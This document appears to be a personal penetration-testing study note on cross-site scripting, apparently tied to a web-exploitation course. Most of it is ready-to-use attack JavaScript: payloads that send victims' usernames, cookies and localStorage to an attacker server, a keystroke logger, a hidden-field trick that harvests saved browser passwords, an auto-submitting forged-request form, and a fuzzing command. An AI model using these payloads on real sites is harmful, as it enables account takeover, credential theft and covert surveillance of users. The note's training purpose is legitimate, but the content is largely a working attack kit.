
>[!info]
>This note is still in development.

### Overview
---
Cross-site scripting (XSS) is a type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.

**Reference(s):**
- https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/
- https://portal.offsec.com/courses/web-200/books-and-videos/modal/modules/cross-site-scripting-exploitation-and-case-study/cross-site-scripting-exploitation/cross-site-scripting-exploitation

### Payloads
---

**Attacker Server-Side:**
```shell
# Hosting a Simple HTTP Server
python -m http.server 80

# or Custom PMA Server
python ./pma_server.py
```

**Victim Payload:**
```shell
<script src="http://<ip_addr>:<port>/<hosted_payload>.js"></script>
```

#### Username Extraction

**Hosted Payload:**
- ``xss_username.js``

```js
var ClientAPI = "https://<ip_addr>:<port>/api/me"
var AttackerURL = "http://<ip_addr>:<port>"
fetch(ClientAPI, {
		method:'GET',
		mode:'cors',
		credentials:'include'
	})
	.then(response => response.json())
	.then((data) => {
		fetch([AttackerURL, "/username?=", data.username].join(''), {
		  mode: 'no-cors'
		});
	});
```

**Output:**
![[Pasted image 20231015202903.png]]

#### Cookie Extraction - Non-HttpOnly attribute (document.cookie)

- ``document.cookie`` = deprecated browser cookie storage that is becoming less common due to the HttpOnly flag.

**Hosted Payload:**
- ``xss_document_cookie.js``

```js
var AttackerURL = "http://<ip_addr>:<port>"
var DocumentCookie = encodeURIComponent(document.cookie)
fetch([AttackerURL, "/docCookie?=", DocumentCookie].join(''), {
	mode: 'no-cors'
});
```

**Output:**
- TBD

#### Cookie Extraction - Local Secrets (localStorage/sessionStorage)

- ``localStorage`` = will keep the data until explicitly deleted.
- ``sessionStorage`` = will keep the data until the tab is closed.

**Hosted Payload:**
- ``xss_local_cookie.js``

```js
var AttackerURL = "http://<ip_addr>:<port>"
var LocalSecretsCookie = encodeURIComponent(JSON.stringify(localStorage))
fetch([AttackerURL, "/localCookie?=", LocalSecretsCookie].join(''), {
	mode: 'no-cors'
});
```

**Output:**
![[Pasted image 20231015202927.png]]

#### Combo - Username + Cookie

**Hosted Payload:**
- ``xss_combo.js``

```js
var ClientAPI = "https://<ip_addr>:<port>/api/me"
var AttackerURL = "http://<ip_addr>:<port>"
fetch(ClientAPI, {
		method:'GET',
		mode:'cors',
		credentials:'include'
	})
	.then(response => response.json())
	.then((data) => {
		fetch([AttackerURL, "/username?=", data.username].join(''), {
		  mode: 'no-cors'
		});
	});
var LocalSecretsCookie = encodeURIComponent(JSON.stringify(localStorage))
fetch([AttackerURL, "/localCookie?=", LocalSecretsCookie].join(''), {
	mode: 'no-cors'
});
```

**Output:**
![[Pasted image 20231015202951.png]]

#### Keylogger

**Hosted Payload:**
- ``xss_keylogger.js``

```js
var AttackerURL = "http://<ip_addr>:<port>"
function logKey(event){
	fetch([AttackerURL, "/key?=", event.key].join(''))
}
document.addEventListener('keydown', logKey)
```

**Output:**
![[Pasted image 20231015203009.png]]

### Saved Password Extraction

**Hosted Payload:**
- ``xss_credentials.js``

```js
var AttackerURL = "http://192.168.49.63"
let body = document.getElementsByTagName("body")[0]
// Username
var u = document.createElement("input");
u.type = "text";
u.style.position = "fixed";
u.style.opacity = "0";
// Password
var p = document.createElement("input");
p.type = "password";
p.style.position = "fixed";
p.style.opacity = "0";
// Extract
body.append(u)
body.append(p)
setTimeout(function(){
	fetch([AttackerURL, "/user?=", u.value, "&pass?=", p.value].join(''))
}, 5000);
```

**Output:**
- TBD
### Other
---

**This note will cover the following types of XSS:**
- Reflected Server XSS
- Stored Server XSS
- Reflected Client XSS
- Stored Client XSS

### Discovery
---

Validate Javascript XSS
```js
<script>alert('Whoops!')</script>

<script>src="http://192.168.49.63"</script>
```

```shell
# XSS Fuzzing
wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt --hh 0 "$URL/index.php?id=FUZZ"di
```

**Random payloads:**

```js
// Note 1: Simple Attacker Fetch
<script>
fetch('http://<attacker_ip>/XSS', {
		  mode: 'no-cors'
		});
</script>

// Note 2: Username Return via Alert
<script>
fetch('https://<ip_addr>:8443/api/me', {
		method:'GET',
		mode:'cors',
		credentials:'include'
	})
	.then(response => response.json())
	.then((data) => {
		alert(['http://<attacker_ip>/username?=', data.username].join(''));
	});
</script>

// Note 3: Username Return via Fetch
<script>
fetch('https://<ip_addr>:8443/api/me', {
		method:'GET',
		mode:'cors',
		credentials:'include'
	})
	.then(response => response.json())
	.then((data) => {
		fetch(['http://<attacker_ip>/username?=', data.username].join(''), {
		  mode: 'no-cors'
		});
	});
</script>

// Note 4: URL Encoded User JSON via Fetch
<script>
fetch('https://<ip_addr>:8443/api/me', {
		method:'GET',
		mode:'cors',
		credentials:'include'
	})
	.then(response => response.json())
	.then((data) => {
		fetch(['http://<attacker_ip>/json?=', encodeURIComponent(JSON.stringify(data))].join(''), {
		  mode: 'no-cors'
		});
	});
</script>
```

- This one automatically redirects.
```js
<form id="autosubmit" action="http://192.168.49.63/notreal" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>

<script>
 document.getElementById("autosubmit").submit();
</script>
```


- Attempting to get element values
```js
<script> alert(document.getElementById('editNote')) </script>

<script>
fetch(['http://192.168.49.63/test?=', data.username].join(''), {
		  mode: 'no-cors'
		});
</script>

Test
<script>
fetch("http://192.168.49.63/"+document.getElementById("myLikes");
</script>

Gimme Local
<script>
fetch(["http://192.168.49.63/", document.getElementById("local")].join(''));
</script>
```